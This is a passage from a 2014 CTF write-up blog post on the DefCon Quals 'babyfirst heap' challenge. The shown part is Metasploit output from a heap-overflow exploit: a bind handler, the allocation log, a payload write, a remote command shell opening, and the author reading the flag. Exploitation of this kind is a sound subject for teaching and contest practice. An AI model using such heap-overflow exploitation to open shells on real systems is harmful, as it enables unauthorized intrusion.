<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</span><span class='line'>
</span><span class='line'><span class="o">[*]</span> <span class="no">Started</span> <span class="n">bind</span> <span class="n">handler</span>
</span><span class='line'>
</span><span class='line'><span class="n">I</span> <span class="n">am</span> <span class="n">going</span> <span class="n">to</span> <span class="n">allocate</span> <span class="mi">20</span> <span class="n">objects</span><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="no">Using</span> <span class="no">Dougle</span> <span class="no">Lee</span> <span class="no">Allocator</span> <span class="mi">2</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="no">Goodluck</span><span class="o">!</span>
</span><span class='line'>
</span><span class='line'><span class="no">Exit</span> <span class="n">function</span> <span class="n">pointer</span> <span class="n">is</span> <span class="n">at</span> <span class="mi">804</span><span class="no">C8AC</span> <span class="n">address</span><span class="o">.</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB008</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1246</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB4F0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1121</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFB958</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">947</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFBD10</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">741</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC000</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">706</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC2C8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">819</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC600</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">673</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFC8A8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1004</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFCC98</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">952</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD058</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">755</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD350</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">260</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD458</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">877</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFD7D0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1245</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFDCB8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1047</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE0D8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1152</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE560</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1047</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFE980</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">1059</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFEDA8</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">906</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFF138</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">879</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span><span class="no">ALLOC</span><span class="o">][</span><span class="n">loc</span><span class="o">=</span><span class="mi">9</span><span class="no">BFF4B0</span><span class="o">][</span><span class="n">size</span><span class="o">=</span><span class="mi">823</span><span class="o">]</span>
</span><span class='line'><span class="no">Write</span> <span class="n">to</span> <span class="n">object</span> <span class="o">[</span><span class="n">size</span><span class="o">=</span><span class="mi">260</span><span class="o">]</span><span class="p">:</span>
</span><span class='line'><span class="o">[*]</span> <span class="no">Copied</span> <span class="mi">273</span> <span class="n">bytes</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="o">[*]</span> <span class="no">Command</span> <span class="n">shell</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">12</span><span class="p">:</span><span class="mi">56273</span> <span class="o">-&gt;</span> <span class="mi">23</span><span class="o">.</span><span class="mi">22</span><span class="o">.</span><span class="mi">192</span><span class="o">.</span><span class="mi">226</span><span class="p">:</span><span class="mi">4444</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2014</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">39</span> <span class="o">-</span><span class="mo">0400</span>
</span><span class='line'>
</span><span class='line'><span class="n">cat</span> <span class="n">key</span>
</span><span class='line'><span class="n">cat</span><span class="p">:</span> <span class="n">key</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
</span><span class='line'><span class="n">cd</span> <span class="sr">/home</span>
</span><span class='line'><span class="sr">ls</span>
</span><span class='line'><span class="sr">babyfirst-heap</span>
</span><span class='line'><span class="sr">ubuntu</span>
</span><span class='line'><span class="sr">cd b</span>
</span><span class='line'><span class="sr">/</span><span class="n">bin</span><span class="o">//</span><span class="n">sh</span><span class="p">:</span> <span class="mi">5</span><span class="p">:</span> <span class="n">cd</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t cd to b</span>
</span><span class='line'><span class="s1">cd babyfirst-heap</span>
</span><span class='line'><span class="s1">cat key</span>
</span><span class='line'><span class="s1">cat: key: No such file or directory</span>
</span><span class='line'><span class="s1">ls</span>
</span><span class='line'><span class="s1">babyfirst-heap</span>
</span><span class='line'><span class="s1">flag</span>
</span><span class='line'><span class="s1">cat flag</span>
</span><span class='line'><span class="s1">The flag is: Good job on that doubly linked list. Why don&#39;</span><span class="n">t</span> <span class="n">you</span> <span class="n">try</span> <span class="n">something</span> <span class="n">harder!</span><span class="o">!</span><span class="no">OMG</span><span class="o">!!</span>
</span></code></pre></td></tr></table></div></figure>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">stacks0n</span></span>

      








  


<time datetime="2014-05-23T13:27:00-04:00" pubdate data-updated="true">May 23<span>rd</span>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/got/'>got</a>, <a class='category' href='/blog/categories/heap/'>heap</a>, <a class='category' href='/blog/categories/overflow-/'>overflow,</a>, <a class='category' href='/blog/categories/overwrite/'>overwrite</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/" data-via="captchaflag" data-counturl="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2/" title="Previous Post: Hack.lu 2013 - Flux Archive Part 2">&laquo; Hack.lu 2013 - Flux Archive Part 2</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/05/23/defcon-quals-2014-shitsco/" title="Next Post: DefCon Quals 2014 - shitsco">DefCon Quals 2014 - shitsco &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton's Corporate Security Safe for Business</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
      </li>
    
  </ul>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <li class="loading">Status updating...</li>
  </ul>
  <script type="text/javascript">
    $.domReady(function(){
      getTwitterFeed("captchaflag", 4, false);
    });
  </script>
  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
  
    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
  
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Captchaflag -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'captchaflag';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/';
        var disqus_url = 'http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
